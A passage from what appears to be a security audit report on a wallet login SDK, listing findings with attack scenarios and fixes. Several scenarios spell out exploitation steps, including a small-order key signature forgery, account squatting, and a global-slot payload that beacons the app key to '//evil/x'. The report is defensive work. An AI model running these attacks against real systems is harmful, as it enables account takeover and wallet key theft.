Bind the login message to the verifier's own domain, not just a random nonce. Minimum: `walletLoginMessage(challenge, appId, origin)` embedding both, with the server building the expected preimage from ITS OWN `config.appId` and a server-configured canonical origin (never from the request body), e.g. an EIP-4361/SIWE-style envelope: `"<origin> wants you to sign in with your Solana account:
<address>

App: <appId>
Nonce: <challenge>
Issued At: <ts>"`. Also stop letting `appId` for the app-key message be a free client string in a security-relevant position — pin the app-key message to the server-verified appId, and additionally include the origin. Note this is a breaking change for existing app keys, so ship it as a versioned message with a migration path. Until then, document the relay risk loudly (SECURITY.md is currently empty).
raw_findings.prior_art_check: grep -rn "cross-app|relay|phish|origin|domain-separat|replay" tests/ — only tests/audit-crypto.test.ts:89 ("H4 RESOLVED — the wallet-app-key message is domain-bound by appId") and tests/ledger-login.test.ts:100, both covering walletAppKeyMessage ONLY. grep -rn "walletLoginMessage" tests/ returns signature-edge-cases, server, multi-app, concurrent-safety, ledger-login — none assert appId/origin binding of the LOGIN message. tests/multi-app.test.ts:133-149 only proves a challenge issued under appId A is not spendable under appId B on the SAME server, which the relay does not need. README.md/SECURITY.md/CHANGELOG.md are 0 bytes, so it is not a documented limitation either.

raw_findings.title: Small-order ed25519 public keys are accepted — an unauthenticated attacker forges a valid "proof of wallet ownership" for the all-zero Solana address (System Program) with no private key
raw_findings.description:
Neither `verifySolanaSignature` nor `verifyAuthSignature` rejects low-order / torsion public keys, and `validatePublicKey` only checks canonical 32-byte base58 (it never calls `PublicKey.isOnCurve` nor an order check). tweetnacl's `crypto_sign_open` (node_modules/tweetnacl/nacl-fast.js:2043-2071) only calls `unpackneg(q, pk)` — a curve-membership check — and has no cofactor/small-order rejection. For a public key A of order 4, the verification equation `[S]B == R + [h]A` is satisfiable with no secret: pick s, set R = [s]B and S = s; whenever `h = SHA512(R||A||M) mod L` is ≡ 0 mod ord(A) (≈1/4 of tries) the `[h]A` term vanishes. The all-zero 32-byte key encodes to base58 `"11111111111111111111111111111111"` — the Solana System Program address — and passes `validatePublicKey` because the round-trip is canonical.

`validateAuthPublicKey` (src/server/routes.ts:87-90) is even weaker: it accepts ANY 64 hex chars, including `"00".repeat(32)`, so an email/biometric account can be registered with a degenerate auth key that anyone can sign for.
raw_findings.attack_scenario: Verified against the shipped dist/ build. Attacker POSTs `/challenge {publicKey:"11111111111111111111111111111111"}` -> C. Offline, grinds s = 1..N until `SHA512(R||A||walletLoginMessage(C)) mod L ≡ 0 mod 4` (found at s=1 in the run) and emits the 64-byte forgery. POSTs `/connect-wallet` with it -> **HTTP 201 with a live session token**, i.e. `verifySolanaSignature` returned true for a key nobody holds. What this buys: the SDK's `loginWallet`/`connectWallet` is exactly a "prove you control this Solana address" primitive, and it can now be lied to about a fixed set of 8 addresses. An integrator that gates an allowlist, airdrop attribution, or on-chain-identity linking on "the SDK said this session owns address X" is defeated for those addresses; the attacker also permanently squats the record and is never rate-limited (limits only fire on failure, src/server/routes.ts:413-418). It does NOT compromise any honest user's key, hence medium not critical.
raw_findings.recommendation: Reject small-order/torsion public keys before verification in both `verifySolanaSignature` and `verifyAuthSignature` — compare the 32-byte key against the 8 known small-order encodings (and the identity point), or switch verification to `@noble/curves` `ed25519.verify(sig, msg, pub, { zip215: false })`, which is already a dependency and enforces cofactor-clearing plus canonical S. Also apply the same rejection in `validatePublicKey`/`validateAuthPublicKey` so a degenerate identity can never be persisted.
raw_findings.prior_art_check: grep -rn "onCurve|low-order|small-order|System Program|malleab|all-zero|zero key" tests/ src/ — zero hits in tests/. tests/signature-edge-cases.test.ts covers only odd-length hex, non-hex chars, an all-zero SIGNATURE against a real key, and an invalid-base58 key — never a low-order PUBLIC key. tests/audit-server.test.ts:222 ("SERVERSIDE-11 … input validation rejects malformed publicKey") only tests EVM 0x addresses and arbitrary strings.

raw_findings.title: A Solana wallet address can be squatted as an email-account identity with no proof of control, trapping the true owner in the attacker's record
raw_findings.description:
`register` demands a signature + challenge only when `body.authMethod === "wallet"`. For `authMethod: "email"` (the default) it accepts ANY well-formed Solana `publicKey` as the account identity with no ceremony, and stores an attacker-chosen `authPublicKey` and `email` under it. The root cause (F2 / SERVERSIDE-5) is a known, tested-as-open finding, but the tests only exercise a freshly-generated identity — they never test claiming a REAL wallet's address, which is where the consequence turns from squatting into a shared-record hijack.

Because `connectWallet` looks up the record purely by `publicKey` AFTER verifying the signature, the genuine wallet owner who later connects is logged into the ATTACKER'S record — keeping the attacker's `email` and `authPublicKey`. The attacker therefore retains a permanent second login (via `/login` with their own email + auth key) into the record where the owner's `encryptedSecret` blobs and any later `/import-wallet` ciphertext accumulate.
raw_findings.attack_scenario: Verified against dist/. 1) Attacker enumerates a target Solana address (public on-chain data). 2) POST /register `{publicKey: <victim addr>, email:"attacker@evil.com", authMethod:"email", authPublicKey:<attacker's>, wallets:[]}` -> **201**. 3) Victim later connects that same wallet to the app: signature verifies, challenge consumes, and the server returns the attacker's record — PoC output: `real owner connects -> 200, record email = attacker@evil.com, authMethod = email, authPublicKey belongs to attacker = true`. 4) Attacker keeps logging in via /login with `attacker@evil.com`, reading `/user-data` for every ciphertext the victim's client subsequently stores, and can churn `issueSession` (single-active-session, src/server/session.ts:50-52) to repeatedly evict the victim. The attacker cannot decrypt the victim's blobs on its own, so this is data exposure + persistent DoS/identity confusion rather than key theft — hence medium.
raw_findings.recommendation: Require a proof-of-control ceremony on the identity `publicKey` for the email/biometric register path too — the client already holds the freshly generated identity secret key, so it can sign the same `walletLoginMessage(challenge)` and the server can reuse `verifySolanaSignature` + `consumeChallenge` verbatim (this also closes F2/SERVERSIDE-5). Additionally, on `connectWallet`, refuse to log a wallet signer into a record whose `authMethod` is `"email"`/`"biometric"` and whose `authPublicKey` was never proven — fail closed rather than silently merging two principals into one record.
raw_findings.prior_art_check: grep -n "describe(" tests/audit-zai-glm-52.test.ts + tests/audit-server.test.ts: F2 ("email/biometric register needs NO signature/challenge (HIGH, currently insecure)", line 91) and SERVERSIDE-5 residual (audit-server.test.ts:133) both assert 201 and are explicitly labelled "still open". Neither test uses a real wallet's address as the squatted identity, and no test exercises the subsequent connectWallet collision — I grepped tests/ for `connectWallet` + `authPublicKey` in the same test and found none.

raw_findings.title: ed25519 signature malleability: tweetnacl accepts (R, S+L), so a login signature is not a canonical value
raw_findings.description:
tweetnacl's `crypto_sign_open` calls `scalarbase(q, sm.subarray(32))` on the raw 32-byte S with no `S < L` canonicality check, so for every valid signature (R,S) the distinct encoding (R, S+L) also verifies. Confirmed empirically: `orig verify true / malleated verify true / same? false`. Both `verifySolanaSignature` and `verifyAuthSignature` inherit this.

This is NOT currently exploitable for replay: `consumeChallenge` deletes the challenge atomically (src/server/challenge.ts:33-35), so the second variant finds nothing to spend. It matters as latent risk because the SDK elsewhere treats a signature as a canonical, deterministic value — `deriveAppKeyFromSignature(bytesToHex(keySig))` makes SHA-256 of the raw signature bytes the wallet-decryption key — and because any future use of the signature as an idempotency/dedupe key (audit log, nonce store, "have I seen this signature" cache) would be trivially bypassed.
raw_findings.attack_scenario: An attacker who observes a valid login signature in flight (the threat model allows a network attacker) can produce a second, byte-different signature that also verifies for the same message and key, defeating any dedupe/replay control keyed on the signature bytes. Today the only such control is the challenge store, which is keyed on the challenge rather than the signature, so the concrete gain is nil — the honest reading is that the codebase is one refactor away from a real replay bug, not that one exists now.
raw_findings.recommendation: Verify with `@noble/curves` `ed25519.verify(..., { zip215: false })` (already a transitive dependency via @solana/web3.js and a direct one via @noble/hashes' sibling) which enforces canonical S, or add an explicit `S < L` check on `sig.slice(32)` before calling tweetnacl. Same change closes the small-order finding above.
raw_findings.prior_art_check: grep -rn "malleab" tests/ src/ — zero hits. tests/signature-edge-cases.test.ts and tests/timing-safe-edge-cases.test.ts contain no S-range or canonical-encoding assertions; tests/audit-crypto.test.ts covers only PBKDF2/GCM/appId-message topics.

raw_findings.title: README.md, SECURITY.md and CHANGELOG.md are empty (0 bytes) in the published v0.6.0 — no integrator guidance for the appId footgun that amplifies the relay attack
raw_findings.description: `DEFAULT_CONFIG.appId = "ttc"` is the shipped default and is the ONLY domain separator for app-key derivation and storage namespacing. The code itself calls this out ("The default \"ttc\" works out of the box but provides NO cross-app isolation — override it in production"), but the only runtime nudge is a `console.warn` in the browser `AuthClient` constructor — `grep -rn "console.warn" src/server/ src/next/` returns nothing, so a server started with the default appId is silent. Meanwhile README.md, SECURITY.md and CHANGELOG.md are all 0 bytes, so an integrator installing `@tetrac/login-sdk` from npm gets no threat model, no "you must set appId", no "set allowedAppIds in production", and no warning about signature relay.
raw_findings.attack_scenario: Not directly exploitable, but it is the reason the critical finding lands so hard in practice: two deployments that both leave appId at the default produce byte-identical login AND app-key prompts, so a malicious site running the SDK out of the box harvests exactly the two signatures needed to take over and decrypt accounts on any other default-configured deployment, with the victim seeing no distinguishing text in either wallet prompt.

Populate SECURITY.md with the threat model and an explicit "a wallet signature obtained by any site authenticates at your deployment" note plus the `allowedAppIds` recommendation, until the login message is origin-bound.

raw_findings.title: Client accepts the server-supplied PBKDF2 iteration count with no floor — enables a 600,000x passkey-cracking downgrade
raw_findings.description:
`loginWithEmail()` fetches `pbkdf2Iterations` from the untrusted `/challenge` response and feeds it straight into `deriveAppKeyFromPasskey` with no range validation. The server-side fix for this (audit F3, `PBKDF2_MIN = 100_000` / `PBKDF2_MAX = 1_000_000` in src/server/routes.ts:96-100) only guards the value the client PINS at register — it never guards the value the client CONSUMES at login. There is no matching clamp anywhere in src/client/. The same unvalidated trust exists on the re-auth path at src/client/authClient.ts:144, where the count comes from `localStorage['ttc_pbkdf2_iter']`.

The downgraded key is not merely used locally: line 267-268 signs a server-issued challenge with the ed25519 auth key deterministically derived from it (`authSeed = SHA-256('ttc-auth-v1:' + appKey)`, src/client/authKey.ts:14-16) and sends that signature to the server. That signature is a publicly verifiable oracle for the downgraded app key.

Secondary consequence: `deriveAppKeyFromPasskey` uses the SYNCHRONOUS `pbkdf2` from @noble/hashes (src/core/crypto.ts:11,32) on the main thread. A response of `pbkdf2Iterations: 2000000000` (no ceiling either) hangs the tab until the user force-kills it.
raw_findings.attack_scenario: A hostile app operator (explicitly in the threat model: 'an insider / hostile app operator wants to steal user wallets') or a network attacker (also in-model: 'no TLS assumptions beyond what the code states') answers `/challenge` with `{challenge: X, pbkdf2Iterations: 1}`. The victim's browser computes appKey' = PBKDF2-HMAC-SHA256(passkey, SHA-256(appId:email), c=1, 32B) and POSTs `{appId, email, challenge: X, signature: ed25519_sign(SHA-256('ttc-auth-v1:'+appKey'), 'Sign in to your TTC account: '+X)}`. The attacker now holds email, appId, challenge and signature — everything needed for a fully OFFLINE dictionary attack costing ONE PBKDF2 iteration plus one ed25519 keygen per guess instead of 600,000 iterations. Recovering the passkey yields the real app key (one 600k derivation), which decrypts every `encryptedSecret` in the user's record — ciphertext the same operator already stores, or that the same MITM can pull from `/user-data`. This defeats the entire non-custodial claim for every email-account user with a human-chosen passkey.
raw_findings.recommendation: Mirror the server's F3 bounds on the client. Export `PBKDF2_MIN`/`PBKDF2_MAX` from core/config.ts and validate in both places: in `loginWithEmail`, reject (do not clamp silently) any `pbkdf2Iterations` that is not an integer in [100_000, 1_000_000] and abort the login with a distinct error — silently clamping upward would produce a wrong key and look like a bad passkey. Apply the identical check to `getPbkdf2Iterations()` at authClient.ts:144 so a tampered localStorage value cannot influence derivation either. Consider moving `deriveAppKeyFromPasskey` to `pbkdf2Async` or a Worker so a large count cannot freeze the main thread.
raw_findings.prior_art_check: Grepped `pbkdf2Iterations|PBKDF2_ITERATIONS|iteration|downgrade|clamp|MIN_ITER` across src/ and tests/. tests/audit-zai-fixes.test.ts:31-70 ('F3 — server PBKDF2 iteration floor') asserts ONLY that `h.register(...)` returns 400 for out-of-band counts — it is a server-route test using `createAuthHandlers`. tests/pbkdf2-iteration-cost.test.ts covers determinism and timing benchmarks only. tests/auth-client.test.ts:127 ('logs in by re-deriving the key and signing the challenge') exercises the happy path with a cooperative mock server and asserts nothing about a hostile iteration count. `grep -rn 'clamp|MIN_ITER|Math.max(100' src/client/ tests/auth-client.test.ts` returns zero hits. Not previously covered.

raw_findings.title: Hot app key is readable and interceptable through the publicly-named `Symbol.for("tetrac.vault")` global slot
raw_findings.description:
The vault state — including `memoryAppKey`, the plaintext app/encryption key — is hung off `globalThis` under `Symbol.for("tetrac.vault")`. `Symbol.for` uses the GLOBAL symbol registry, so the key is reproducible by any script on the origin from a string that is written verbatim in the published source. Two distinct problems:

(1) Passive read. `globalThis[Symbol.for('tetrac.vault')].memoryAppKey` is a one-liner that returns the live key during any unlocked window. It is also discoverable without reading the source via `Object.getOwnPropertySymbols(globalThis)`.

(2) Pre-plant / permanent interception. `resolveVaultState()` does `let state = g[VAULT_STATE_KEY]; if (!state) {...}` — it performs NO validation of a pre-existing object. Any script that runs BEFORE the SDK module initializes can plant its own object with an accessor on `memoryAppKey`. The module-level `const vault = resolveVaultState()` then binds permanently to it, and every `armAppKey()` write is exfiltrated. This needs no interaction with the SDK's exports at all.

The surrounding comment's defenses are misleading: `enumerable: false` only hides the slot from `for-in`/`JSON.stringify` (obfuscation, not a control), and the claim that `writable: false` prevents swapping the live vault is false in the pre-plant direction (the property does not exist yet, so plain assignment works) and also false afterwards, since `configurable: true` permits `Object.defineProperty` to redefine it.
raw_findings.attack_scenario: An attacker with script execution on the integrating app's origin — full XSS, or merely a compromised third-party tag (analytics, ad, a trojaned transitive npm dep in the app bundle) that loads before the SDK — inserts `globalThis[Symbol.for('tetrac.vault')] = {memoryAppKey:null, lockDeadline:null, lockTimer:null, autoLockMs:15000, lockOnHide:true, hideHandlerBound:false, listeners:new Set(), clearHooks:new Set(), get _k(){}, set memoryAppKey(v){ if(v) navigator.sendBeacon('//evil/x', v); this.__k = v; }, get memoryAppKey(){ return this.__k; }}`. From then on every login, unlock, and biometric re-arm ships the app key to the attacker. Because the app key is DETERMINISTIC and never rotated (there is no rotation API in the SDK), one capture equals permanent decryption of every wallet ciphertext the attacker can later obtain from `/user-data` (using the localStorage bearer token, which is also readable) or from a DB leak. The 15-second auto-lock provides no protection: the key is captured at the moment it is armed, not scraped later.
raw_findings.recommendation: Do not put raw key material in a globally-addressable slot. Keep `memoryAppKey` in a module-private `WeakMap`/closure and expose only opaque operations across the global seam — e.g. store an unforgeable handle in the global slot and keep the actual key in a non-extractable `CryptoKey` obtained via `crypto.subtle.importKey(..., extractable=false)` so `crypto.subtle` holds the bytes and JS never can. Failing that: (a) validate the pre-existing slot shape and refuse to adopt an object carrying accessors on `memoryAppKey`; (b) set `configurable: false`; (c) derive the symbol name from a build-time random rather than a literal; and (d) correct the comment so integrators do not read it as an XSS control. Cross-reference: the same global object also carries `clearHooks`, which an attacker can empty to defeat the logout purge.
raw_findings.prior_art_check: Grepped `Symbol.for|tetrac.vault` across src/ and tests/. The only test coverage is tests/dual-bundle-vault.test.ts:51,91-100, which asserts the INVARIANT that both the /client and /react bundles resolve the same slot ('binds BOTH /client and /react to the same globalThis Symbol.for("tetrac.vault") slot'). tests/cross-tab-lock.test.ts:42 and tests/audit-client-vault.test.ts:39 merely `delete (globalThis as any)[Symbol.for('tetrac.vault')]` to simulate a page reload. Nothing tests hostile occupation or reading of the slot. tests/audit-client-vault.test.ts covers only H3 (appKey not in sessionStorage) and CLIENTVAULT-2/3/4 — a different exposure surface. Not previously covered.

raw_findings.title: Biometric unlock converts the ephemeral memory-only key into a persistent, XSS-scriptable recovery path; the "XSS can never unwrap" claim is incomplete
raw_findings.description:
The module's AT-REST SAFETY note asserts that "Storage-scraping XSS reads ciphertext it can never unwrap." That is true only for a passive scraper. The unwrap is fully scriptable from the origin, and every input it needs is either exported or sitting in localStorage:

- `unwrapAppKey`, `unlockViaBiometric`, `derivePasskeySecret` and `hasBiometricUnlock` are all public exports (src/client/index.ts:27-38, and `unwrapAppKey` is exported at biometricUnlock.ts:101).
- The `PasskeyRegistration` needed to drive them is written to `localStorage['ttc_biometric_reg']` as plain JSON by the React hook (src/react/useBiometricUnlock.ts:19,35), and is described there as "NON-SECRET".

So a script on the origin does `unlockViaBiometric(JSON.parse(localStorage['ttc_biometric_reg']))` and then reads the freshly-armed key out of the global vault slot (see the separate `Symbol.for('tetrac.vault')` finding), or directly `await unwrapAppKey(reg.credentialId, await derivePasskeySecret(reg))`. The only remaining gate is that the browser shows a Touch ID / Face ID prompt with generic platform chrome — indistinguishable from the app's own legitimate unlock prompt, which the user has been trained to approve.

The net effect is a security-model inversion worth stating plainly: without biometric unlock, the app key exists only for a <=15s window and a reload destroys it (this is the documented core defense at session.ts:3-12). WITH biometric unlock enabled, the key becomes recoverable on demand, at any time, even while the vault is locked and even across reloads — by anything that can execute script and elicit one biometric touch.
raw_findings.attack_scenario: Attacker achieves XSS on the integrating app (in the stated threat model). Instead of racing the 15s unlocked window, the payload checks `localStorage['ttc_biometric_unlock']` (the sync marker at biometricUnlock.ts:39,162) and `localStorage['ttc_biometric_reg']`. If present, it calls the SDK's own exported `derivePasskeySecret(reg)` -> `unwrapAppKey(reg.credentialId, secret)`, which triggers one Touch ID prompt. The user, who is actively using the app, approves. The attacker receives the account's real app key, POSTs it out along with the localStorage bearer token, fetches `/user-data`, and decrypts every wallet — funds and signing, Solana and EVM — permanently, since the app key never rotates.
raw_findings.recommendation: Correct the comment: the control is 'requires a user-visible biometric prompt', not 'XSS can never unwrap'. Then reduce what script can do with it: (a) require a transient user activation (`navigator.userActivation.isActive`) before `derivePasskeySecret` so a background payload cannot silently raise the prompt; (b) do not export `unwrapAppKey` from the public `@tetrac/login-sdk/client` surface — it exists only to serve `AuthClient.deriveAppKey`; (c) stop persisting the registration descriptor in localStorage (keep it in the same IndexedDB store as the blob, or in memory, so the whole attack chain is not readable from one synchronous API); and (d) document prominently that enabling biometric unlock trades the memory-only guarantee for on-device persistence, so integrators can make that choice deliberately.
raw_findings.prior_art_check: Grepped `biometric|unwrap|MARKER_KEY|ttc_biometric` across tests/. tests/biometric-gate-resistance.test.ts (C6) tests only crypto primitives — non-extractable key export rejection, GCM tag on tampered ciphertext, IV uniqueness, legacy record migration — never a scripted unwrap. tests/biometric-unlock.test.ts:247 ('a tampered AES-GCM blob fails closed'), :263 ('a declined/absent assertion fails closed'), :273 ('disable purges the blob'), :289 (logout purge) and :321 (the registration-vs-biometricUnlock DISTINCTION GUARD) all assume a cooperative caller. tests/react-hooks.test.tsx:173-189 (F9) only checks that the descriptor is purged on logout, which implicitly confirms it IS in localStorage while logged in. No test covers a hostile caller driving the exported unwrap path.

raw_findings.title: Logout leaves orphaned wrapped app keys in IndexedDB — the purge tracks only one credential and is fire-and-forget
raw_findings.description:
The logout purge hook recovers the credential to delete from a SINGLE-VALUE localStorage marker, and it fires the deletions without awaiting. Two ways a live wrapped app key survives 'logout' with no remaining pointer to it:

(1) Marker overwrite. `enableBiometricUnlock` does `localStorage.setItem(MARKER_KEY, registration.credentialId)` (line 183) — a scalar, not a set. Enable biometric unlock for account A, then for account B on the same device (or re-enable after a failed first attempt, which still completes `wrapAppKey` before `setItem`), and the marker now names only B. The `unlock_blobs` record for A — AES-GCM ciphertext of account A's real app key — is orphaned. Logout deletes only B's. `disableBiometricUnlock(reg)` cannot reach A either, because the React hook's `ttc_biometric_reg` descriptor was likewise overwritten (src/react/useBiometricUnlock.ts:35) and is itself purged at logout (line 46).

(2) Unawaited deletion. `AuthClient.logout()` (src/client/authClient.ts:465-473) is synchronous and returns immediately; `clearSession()` fires the hook, which removes the marker SYNCHRONOUSLY but calls `void blobDelete(credentialId).catch(() => {})`. If the user's logout click is a link/navigation, or the tab is closed, the in-flight IndexedDB transaction is aborted by the browser at unload. The marker is already gone, so the blob is now unreachable by every code path in the SDK.

In both cases `hasBiometricUnlock()` returns false and the UI truthfully reports 'biometric unlock is not set up' while a decryptable copy of the account's app key remains on disk indefinitely.
raw_findings.attack_scenario: Alice uses the app on a shared/family laptop, enables biometric unlock, later switches to a second account (or the app re-enables after an error), and logs out. Account A's wrapped app key remains in the `ttc_passkey_store` -> `unlock_blobs` object store forever, keyed by credA. Bob later obtains the laptop. IndexedDB is origin-scoped, not session-scoped, so the blob is still there. Bob reads credA from the store, calls `navigator.credentials.get({allowCredentials:[credA], userVerification:'required'})` from the app's origin (or a devtools console on it) and satisfies userVerification with the device passcode/password — which platform authenticators accept as a userVerification factor alongside biometrics. `unwrapAppKey(credA, secret)` returns account A's app key. With the ciphertext (from a DB leak, or by logging in as A after a password reset flow, or from any cached `/user-data` response) Bob decrypts all of Alice's wallets. The same residue also survives 'log out on a public machine', which is precisely the action users take to prevent this.
raw_findings.recommendation: (a) Make the marker a SET of credentialIds (or drop the marker and enumerate `unlock_blobs` keys directly via `IDBObjectStore.getAllKeys()`, using localStorage only as a sync hint) so every enabled credential is purged. (b) Refuse to overwrite: have `enableBiometricUnlock` purge any pre-existing blob before writing the new one, so at most one can ever be orphaned. (c) Make the purge deletion-first and durable — do `clear()` on the whole `unlock_blobs` + `gate_secrets` stores rather than a per-key delete, and expose an awaitable `logoutAsync()` so integrators can `await` the purge before navigating. Removing the marker BEFORE the durable delete completes is the specific ordering that makes a partial purge unrecoverable; invert it or make the delete the source of truth.
raw_findings.prior_art_check: Grepped `MARKER_KEY|ttc_biometric_unlock|orphan|blobDelete|purge` across tests/. tests/biometric-unlock.test.ts:289 ('clearSession (logout) purges the unlock blob + gate secret (PRD §7)') covers exactly ONE credential from a single `freshEnable`, and explicitly drains the microtask queue (`await new Promise((r) => setTimeout(r, 0))`) before asserting the stores are empty — i.e. it assumes the completion this finding says is not guaranteed at real page unload, and never enables a second credential. tests/biometric-unlock.test.ts:273 ('disable purges the blob') is the argful path. tests/react-hooks.test.tsx:173-189 (F9) covers only the React descriptor key. No test enables twice, and no test asserts durability of the purge across unload. Not previously covered.

raw_findings.title: `unlock()` silently arms a wrong app key when no `validateWith` wallet is available
raw_findings.description:
`unlock(creds, validateWith?)` only verifies the re-derived key when the caller supplies a wallet to test-decrypt. With `validateWith` undefined it calls `armAppKey(appKey)` unconditionally — for the `{ passkey }` variant a wrong passkey therefore produces a wrong 32-byte key that is installed as the live vault key, and `getAuthStatus()` (src/client/session.ts:334-338) then reports 'authenticated'. The React wrapper documents the opposite guarantee ('Validates against a known wallet (so a wrong passkey is rejected, not silently armed)', src/react/useAuth.ts:38-39) but passes `user?.wallets?.[0]`, which is `undefined` whenever the `/user-data` fetch has not resolved, has failed, or the account genuinely has no stored wallets — the latter is reachable for a Web3 account configured with `walletGen: { solana: ['funds'] }`, since `web3WalletGen()` (authClient.ts:92-95) strips the `funds` role and `flattenBundle` then yields an empty array.

Note the `{ biometricUnlock }` variant is NOT affected (AES-GCM authentication in `unwrapAppKey` fails closed), and `{ signMessage }` is not affected in practice; this is specific to the passkey path where any input produces a syntactically valid key.
raw_findings.attack_scenario: Not an attacker-driven key compromise — the impact is integrity of the vault state. A user mistypes their passkey during a re-auth that happens before user-data loads; the SDK reports `status: 'authenticated'` and `isLocked: false`, the app enables its signing UI, and every subsequent operation fails with an opaque 'Decryption failed: wrong key or corrupted ciphertext'. Worse, if the user then taps 'enable biometric unlock', `enableBiometricUnlock` (biometricUnlock.ts:175-184) wraps and persists the WRONG key to IndexedDB, so every future biometric unlock silently restores a useless key and the user believes their wallet is corrupted. An attacker who can suppress the `/user-data` response (network position, or a 500 from a hostile operator) can force this state deterministically.
raw_findings.recommendation: Make validation mandatory for the `{ passkey }` and `{ registration }` variants rather than opt-in: if `validateWith` is absent, either refuse to arm (throw a distinct `CannotValidateError`) or fetch a wallet via `fetchUserData()` first. Alternatively store a small server-side `appKeyCheck` (a ciphertext of a constant under the app key) alongside `authPublicKey` at registration, so validation never depends on the account happening to own a wallet. At minimum, have `useAuth().reauthenticate` refuse to call `unlock` while `user` is null instead of degrading to the unvalidated path, and fix the comment at useAuth.ts:38-39 which currently states a guarantee the code does not always provide.
raw_findings.prior_art_check: Grepped tests/auth-client.test.ts and tests/react-hooks.test.tsx for unlock/reauth coverage. tests/auth-client.test.ts:252 is 'unlock re-runs the ceremony, validates against a wallet, and arms the vault' — the validateWith-PRESENT path only. tests/auth-client.test.ts:235 ('revealSecret with a wrong passkey fails closed') covers `revealSecret`, which is a different method that never arms. No test calls `unlock(creds)` with `validateWith` omitted, and no test covers `reauthenticate` while `user` is null. Not previously covered.

raw_findings.title: Lock-on-hide, bfcache re-lock and cross-tab lock never bind unless `configureVault()` is called
raw_findings.description:
`bindHideHandler()` is the sole registration point for the `visibilitychange`, `freeze`, `pagehide`, `pageshow`(persisted) and `storage` listeners — i.e. every lock trigger except the idle timer. `grep -rn 'bindHideHandler|configureVault' src/` shows it is called from exactly one place, `configureVault` (line 133), which in turn is called from exactly one place in src/: the `AuthClient` constructor (src/client/authClient.ts:117). But `setSession`, `armAppKey`, `touchVault` and `configureVault` are all first-class public exports of `@tetrac/login-sdk/client` (src/client/index.ts:10-26). An integrator who wires a custom flow with `setSession(...)`/`armAppKey(...)` without ever constructing an `AuthClient` gets a vault with the idle timer (defaults are baked into the state initializer at session.ts:78-79) but with NO lock on tab hide, NO lock on bfcache restore, and NO cross-tab lock — the CLIENTVAULT-7 defense is silently absent.

Relatedly, `touchVault()` is also a public export with no absolute session ceiling: `setInterval(touchVault, 1000)` keeps the key hot indefinitely (session.ts:223-227 resets `lockDeadline` on every call with no cap), so the 15s auto-lock has no upper bound on total key lifetime.
raw_findings.attack_scenario: An integrator following the low-level client API (which the package exports as a supported surface) ships an app where the app key survives tab-hide on a shared kiosk and survives a logout performed in a sibling tab. A shoulder-surfer or the next user of the machine returns to the still-hot tab and the vault is unlocked. Separately, an attacker with script execution can call the exported `touchVault()` on a timer to guarantee the key is armed whenever they want to read it, neutralising the 15-second exposure-window argument the security model rests on.
raw_findings.recommendation: Bind the lifecycle and `storage` listeners lazily but unconditionally — call `bindHideHandler()` from `armAppKey()` (and from module init when `hasWindow()`), not only from `configureVault()`. That way any path that arms a key gets the full lock coverage regardless of whether an `AuthClient` was constructed. Additionally add an absolute session ceiling (`maxUnlockedMs`) that `touchVault()` cannot extend past, so a hot key has a hard upper bound on lifetime.
raw_findings.prior_art_check: Grepped `bindHideHandler|configureVault` across src/ and tests/. Every test that exercises the storage/visibility listeners first calls `configureVault(...)` explicitly and says so — tests/cross-tab-lock.test.ts:56 ('mod.configureVault({ autoLockMs: 100_000 }); // binds the storage listener'), tests/cross-tab-lock.test.ts:40 (comment: 'bindHideHandler() re-registers the `storage` listener'), tests/biometric-unlock.test.ts:165 ('configureVault binds a visibilitychange listener once window exists'). No test covers the arm-without-configureVault path, and no test bounds total unlocked lifetime against repeated touchVault(). Not previously covered.

raw_findings.title: Zeroization is nominal: `withDecryptedKey` releases only a reference, and the sibling decrypt APIs have no lifetime bound at all
raw_findings.description:
`withDecryptedKey` is presented as the decrypt-to-sign primitive, but `secret = null` in the `finally` block clears one local binding while the string itself, the `TextDecoder` output inside `decryptSecret` (src/core/crypto.ts:89), and the `ArrayBuffer` returned by `crypto.subtle.decrypt` all remain in the heap until GC — and the callback `fn` has already received and may retain the same string. The code comment is honest about this ('JS strings can't be truly zeroed'), which is the correct posture and I am not calling it a defect.

What is worth flagging is the asymmetry: `useSigner()` exposes THREE decrypt entry points (src/react/useSigner.ts:22-41) and only `sign` routes through `withDecryptedKey`. `decrypt(wallet)` returns the raw plaintext private key as an unmanaged string with no lifetime bound whatsoever, and `solanaKeypair(wallet)` returns a `Keypair` whose `secretKey` is a `Uint8Array` — the one representation that COULD genuinely be zeroized with `.fill(0)` — with no facility to do so. `decrypt` is the shortest and most obvious API, so integrators will reach for it first.
raw_findings.attack_scenario: No direct attack path; this is blast-radius amplification. Given script execution during or after a signing operation, plaintext private keys retained by consumer code (a React state variable holding the output of `decrypt()`, a memoized `Keypair`) extend the window in which an attacker can read key material well beyond the 15s vault lock, and survive a `lockVault()` that the user believes cleared everything. Heap snapshots taken by a browser extension or a crash reporter capture them for the same reason.
raw_findings.recommendation: Add a `withSolanaKeypair(wallet, appKey, fn)` scoped variant that calls `keypair.secretKey.fill(0)` in its `finally` — for `Uint8Array` this is real zeroization, unlike the string case, and it is the representation Solana signing actually needs. Deprecate or clearly warn on `useSigner().decrypt`, steering integrators to `sign`. Where feasible, decrypt into a `Uint8Array` and avoid materialising a hex string at all. Keep the honest 'strings can't be zeroed' note but extend it to say which APIs do and do not bound lifetime.

No prior audit ID in src/ references zeroization beyond the wallet.ts:97-99 comment itself. Reported as info, not a defect.

raw_findings.title: Rate-limit bucket keys the RAW email while account lookup normalizes it — per-account throttle is bypassed by case variation
raw_findings.description: Every email-keyed rate-limit bucket is built from the request's RAW `body.email`, but the account resolution that decides which record the request hits runs through `normalizeEmail()` (lowercase+trim) inside the store. `victim@example.com`, `Victim@example.com`, `vIctim@example.com` … all resolve to the SAME account but land in DIFFERENT rate-limit buckets. `EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/` (routes.ts:50) imposes no case constraint, so an n-letter address yields 2^n independent buckets for one account. This defeats the ONLY server-side anti-brute-force control on `/login` and `/challenge`. Because the email/passkey app key is derived client-side from a user-chosen secret string and that same app key both authenticates (ed25519 auth key) and DECRYPTS the wallet ciphertext, unlimited online guessing against a named account is a path to wallet compromise. The asymmetry is perfectly perverse: an attacker naming the exact address can exhaust the victim's bucket (finding #2), while an attacker who wants unlimited attempts simply varies the case.
